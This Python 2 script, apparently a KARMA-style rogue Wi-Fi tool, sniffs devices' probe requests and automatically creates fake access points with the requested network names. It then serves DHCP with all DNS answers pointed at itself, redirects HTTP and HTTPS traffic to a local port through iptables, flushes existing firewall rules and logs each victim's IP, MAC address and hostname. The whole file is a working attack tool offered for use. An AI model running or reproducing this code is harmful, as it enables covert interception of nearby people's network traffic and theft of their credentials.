#!/usr/bin/env python

from threading import Lock,Thread
import time,random,re,tempfile
import subprocess
from scapy.all import *
from select import select
import argparse


DEFAULT = '\033[49m\033[39m'
RED = '\033[91m'
BRED = '\033[101m'
DRED = '\033[107m\033[41m'
BLUE = '\033[94m'
DBLUE = '\033[107m\033[44m'
GREEN = '\033[92m'
DGREEN = '\033[107m\033[42m'
YELLOW = '\033[93m'

def _ctxt(txt,color):
  return ''.join((color,txt,DEFAULT))


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -g 192.168.0.1")
    parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
    parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
    parser.add_argument("-a", "--hostapd", help="shoose the hostapd interface")
    parser.add_argument("-n", "--name", help="start only this given essid")
    return parser.parse_args()


class Karma2:

  FORBIDDEN_APS = ('ottersHQ','forYourOttersOnly')

  class AccessPoint(Thread):
    def __init__(self, karma, ifhostapd, essid, timeout):
      Thread.__init__(self)
      self.essid = essid
      self.karma = karma
      self.timeout = timeout
      self.ifhostapd = ifhostapd

      self.activity_ts = time.time()

      iface,self.airbase_process = self.create_hostapd_access_point(essid)
      subnet = self.karma.get_unique_subnet()
      self.setup_iface(iface,subnet)
      # redirect the following ports
      self.setup_redirections(iface,80,8080)
      self.setup_redirections(iface,443,8080)
      #self.setup_redirections(iface,443,8080)
      self.dhcpd_process = self.start_dhcpd(iface,subnet)

    def run(self):
      nclients = 0
      while True:

        # check timeout
        if nclients == 0 and time.time() - self.activity_ts > self.timeout:
          print "[x] No activity for essid",self.essid,"destroying AP"
          self.dhcpd_process.kill()
          self.dhcpd_process.wait()
          self.airbase_process.kill()
          self.airbase_process.wait()
          self.karma.release_ap(self.essid)
          return

        dhcpfd = self.dhcpd_process.stderr.fileno()
        airfd = self.airbase_process.stdout.fileno()

        rlist,wlist,xlist = select([dhcpfd,airfd],[],[],1)
        if dhcpfd in rlist:
          line = self.dhcpd_process.stderr.readline()
          if len(line) == 0:
            continue
          m = re.match(
            r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
          if m is not None:
            ip,mac,name = m.groups()
            print "DHCPACK from %s (%s)"%(_ctxt(ip, GREEN),name)
            nclients += 1
          m = re.match(
            r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*",line)
          if m is not None:
            mac = m.groups()
            print "dissociated %s"%mac
            nclients -= 1

        if airfd in rlist:
          line = self.airbase_process.stdout.readline()
          if len(line) == 0:
            continue
          m = re.match(r".*Client ([0-9A-Za-z:]+) associated \(\w+\) to ESSID",line)
          if m is not None:
            mac, = m.groups()
            print "Client",mac,"associated to",self.essid

            self.activity_ts = time.time()

    def setup_redirections(self, iface, inport, outport):
      print "[+] Setting up (%s) %d to %d redirection"%(iface,inport,outport)
      cmd = ['iptables',
        '-t', 'nat',
        '-A', 'PREROUTING',
        '-i', iface,
        '-p', 'tcp',
        '--dport', str(inport),
        '-j', 'REDIRECT',
        '--to-port', str(outport),
        ]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      p.wait()
      return p

    def start_dhcpd(self, iface, subnet):
      # create a temporary file
      print "[+] Starting dhcp server %s %s"%(iface,subnet)
      cmd = ['dnsmasq',
        '-d',
        '--bind-dynamic',
        '-i', iface,
        '-F', '192.168.%d.100,192.168.%d.200'%(subnet,subnet),
        '--dhcp-option=option:router,192.168.%d.254'%(subnet),
        '--dhcp-option=option:dns-server,192.168.%d.254'%(subnet),
        '-R','--address=/#/192.168.%d.254'%(subnet)
      ]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      return p

    def setup_iface(self, iface, subnet):
      print "[+] Uping iface %s w/ subnet %s"%(iface,subnet)
      iprange = "192.168.%d.254/24"%subnet
      cmd = ["ifconfig",iface,iprange]
      p = subprocess.Popen(cmd)
      p.wait()

    def create_hostapd_access_point(self, essid):
      print "[+] Creating (hostapd) AP %s"%_ctxt(essid,GREEN)

      interface = self.ifhostapd
      channel = 4

      f = tempfile.NamedTemporaryFile(delete=False)
      f.write("ssid=%s\n"%(essid))
      f.write("interface=%s\n"%(interface))
      f.write("channel=%s\n"%(channel))
      f.close()

      cmd = ["hostapd",f.name]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
      return interface,p

    def create_airbase_access_point(self, essid):
      print "[+] Creating (airbase) AP %s"%essid
      cmd = ["airbase-ng",
        "--essid", "%s"%essid,
        "-c","4",
        "-I","2000",
        self.karma.ifmon]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE)

      while True:
        line = p.stdout.readline()
        m = re.match(r".*Created tap interface (\w+)",line)
        if m is not None:
          iface, = m.groups()
          return iface,p

  def __init__(self, ifgw, ifmon, ifhostapd = None):
    self.ifmon = ifmon
    self.ifgw = ifgw
    self.ifhostapd = ifhostapd
    self.aps = {}
    self.subnets = set(xrange(50,256)) 
    self.clear_iptables()
    self.setup_nat(ifgw)

  def clear_iptables(self):
    print "[+] Clearing iptables rules"
    cmd = ['iptables','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

    cmd = ['iptables','-t','nat','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def setup_nat(self, iface):
    print "[+] Setting up NAT on %s"%iface
    cmd = ["iptables", 
      "-t","nat",
      "-A","POSTROUTING",
      "-o",iface,
      "-j","MASQUERADE"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def get_unique_subnet(self):
    return self.subnets.pop()

  def register_ap(self, essid, ap):
    self.aps[essid] = ap

  def release_ap(self, essid):
    self.aps.pop(essid)

  def create_ap(self, essid, timeout = 30):
    ap = self.AccessPoint(self, self.ifhostapd, essid, timeout)
    ap.daemon = True
    ap.start()
    self.register_ap(essid,ap)

  def do_sniff(self):
    def _filter(packet):
      if packet.haslayer(Dot11ProbeReq):
        section = packet[Dot11ProbeReq][Dot11Elt]
        # SSID
        if section.ID == 0 and section.info != '':
          
          # limit concurrent APs
          if len(self.aps) > 0:
            return

          if (not section.info in self.aps.keys()
            and not section.info in self.FORBIDDEN_APS):
            
            self.create_ap(section.info)

    sniff(prn=_filter,store=0)

if __name__ == '__main__':

  args = parse_args()
  if args.enable is not None:
    cmd = "airmon-ng start %s"%args.enable
    subprocess.Popen(cmd)
    
  km = Karma2(args.gateway, args.monitor, args.hostapd)
  if args.name is not None:
    # 24h timeout
    km.create_ap(args.name, 60*60*24)
  else:
    km.do_sniff()

  while True:
    time.sleep(1)
